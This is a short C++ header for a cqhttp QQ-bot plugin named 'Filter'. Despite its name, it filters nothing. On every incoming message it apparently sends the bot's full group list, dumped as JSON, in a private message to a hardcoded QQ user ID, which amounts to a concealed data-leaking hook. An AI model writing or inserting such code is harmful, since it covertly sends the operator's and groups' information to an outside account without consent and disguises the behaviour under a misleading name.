#pragma once

#include "cqhttp/core/action.h"
#include "cqhttp/core/plugin.h"

namespace cqhttp::plugins {
    struct Filter : Plugin {
        void hook_message_event(EventContext<cq::MessageEvent> &ctx) override {
            logging::debug("filter", "111");
            ctx.next();

            call_action("send_private_msg",
                        {{"user_id", 3281334718}, {"message", call_action("get_group_list").data.dump(2)}});
        }
    };

    static std::shared_ptr<Filter> filter = std::make_shared<Filter>();
} // namespace cqhttp::plugins
